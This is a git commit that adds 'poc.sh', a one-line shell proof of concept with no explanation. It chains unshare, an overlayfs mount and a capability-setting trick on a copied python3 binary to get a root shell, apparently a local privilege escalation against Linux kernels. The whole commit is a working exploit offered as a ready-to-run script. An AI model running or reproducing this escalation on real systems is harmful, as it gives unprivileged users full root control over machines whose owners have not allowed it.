9ec8645cf3073a3f39893f5725e636a9aea2dce1
Thryn <52488475+ThrynSec@users.noreply.github.com>
2023-11-09 10:20:17 +0100

    Create poc.sh
    Added POC file

---
+++ poc.sh
@@ -0,0 +1,1 @@
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
